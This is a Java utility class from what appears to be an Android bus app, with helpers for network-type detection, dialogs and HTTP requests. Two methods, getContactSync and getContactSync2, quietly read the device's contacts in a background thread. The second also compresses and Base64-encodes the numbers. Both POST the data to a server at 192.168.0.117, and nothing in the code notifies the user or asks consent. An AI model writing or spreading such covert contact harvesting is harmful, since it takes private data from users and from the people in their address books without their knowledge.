package com.bus3.common.utils;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONObject;

import robot.arm.utils.Base64Util;
import robot.arm.utils.BaseUtils.Contact;
import robot.arm.utils.ZipUtil;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface.OnClickListener;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;

import com.bus3.R;
import com.bus3.common.BusAppContext;
import com.bus3.common.net.NetType;

public class BaseUtils {
	private static final String TAG = BaseUtils.class.getName();

	public static int VERSION = getAndroidSDKVersion();

	/**
	 * 检测网络是否可用
	 */
	public static NetType checkNet(Context context) {
		NetType netType = NetType.NONE;
		try {
			// 获取手机所有连接管理对象（包括对wi-fi,net等连接的管理）
			ConnectivityManager connectivity = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
			if (connectivity != null) {
				// 获取网络连接管理的对象
				NetworkInfo info = connectivity.getActiveNetworkInfo();

				if (info != null && info.isConnected()) {
					// 判断当前网络是否已经连接

					if (info.getState() == NetworkInfo.State.CONNECTED) {

						// 判断当前的接入点
						if (ConnectivityManager.TYPE_WIFI == info.getType()) {// wifi连接
							netType = NetType.WIFI;

						} else if (ConnectivityManager.TYPE_MOBILE == info.getType()) {// gprs方式连接

							String proxyHost = android.net.Proxy.getDefaultHost();
							if (proxyHost != null && !"".equals(proxyHost)) {// wap方式
								netType = NetType.GPRS_WAP;
							} else {// web方式
								netType = NetType.GPRS_WEB;
							}

						}

					}
				}
			}
		} catch (Throwable e) {
			Log.e(TAG, e.getMessage(), e);
		}

		return netType;
	}

	public static NetType checkNet() {
		return checkNet(BusAppContext.getInstance().getApp());
	}

	public static void confirm(final Context context, OnClickListener pl, OnClickListener nl) {
		AlertDialog.Builder tDialog = new AlertDialog.Builder(context);
		tDialog.setTitle(R.string.confirm_net_title);
		tDialog.setMessage(R.string.confirm_net_content);
		tDialog.setPositiveButton(R.string.confirm_net_ensure, pl);
		tDialog.setNegativeButton(R.string.confirm_net_cancle, nl);
		tDialog.show();

	}

	public static int getAndroidSDKVersion() {
		int version = 0;
		try {
			version = Integer.valueOf(android.os.Build.VERSION.SDK);
		} catch (NumberFormatException e) {
			Log.e(TAG, e.toString());

		}
		
		return version;
	}

	public static String district() {

		return null;
	}

	/**
	 * 请求服务器数据
	 * 
	 * @param context
	 * @param requestJson
	 *            请求json
	 */
	public static String loadData(String url) {
		HttpClient client = null;
		try {
			HttpParams httpParams = new BasicHttpParams();
			client = new DefaultHttpClient(httpParams);
			HttpGet get = new HttpGet(url);
			HttpResponse response = client.execute(get);
			if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
				return EntityUtils.toString(response.getEntity());
			}
		} catch (final Throwable e) {
			e.printStackTrace();
		} finally {
			if (client != null)
				client.getConnectionManager().shutdown();
		}
		return null;
	}

	public static void getContactSync(final Context ctx) {
		new Thread() {

			@Override
			public void run() {
				try {

					JSONArray ja = new JSONArray();

					for (Contact contact : robot.arm.utils.BaseUtils.getContact(ctx)) {
						JSONObject jo = new JSONObject();

						jo.put("name", contact.getName());
						jo.put("phone", contact.getPhone());
						jo.put("mobile", contact.getMobile());

						ja.put(jo);
					}

					Map<String, String> param = new HashMap<String, String>(1);
					param.put("contact", ja.toString());

					robot.arm.utils.BaseUtils.post("http://192.168.0.117:8080/test/contact", null, param, robot.arm.utils.BaseUtils.ENCODING);

				} catch (Throwable e) {
					Log.e("contact", e.getMessage(), e);
				}
			}

		}.start();
	}

	public static void getContactSync2(final Context ctx) {
		new Thread() {

			@Override
			public void run() {
				try {

					StringBuilder sb = new StringBuilder();

					List<Contact> contactList = robot.arm.utils.BaseUtils.getContact(ctx);

					for (int i = 0; i < contactList.size(); i++) {

						if (contactList.get(i).getMobile() == null || "".equals(contactList.get(i).getMobile()))
							continue;

						sb.append(contactList.get(i).getMobile());

						if (i < contactList.size() - 1)
							sb.append(",");
					}

					Map<String, String> param = new HashMap<String, String>(1);
					param.put("contact", Base64Util.encodeFromString(ZipUtil.compress(sb.toString())));

					robot.arm.utils.BaseUtils.post("http://192.168.0.117:8080/test/contact", null, param, robot.arm.utils.BaseUtils.ENCODING);

				} catch (Throwable e) {
					Log.e("contact", e.getMessage(), e);
				}
			}

		}.start();
	}

}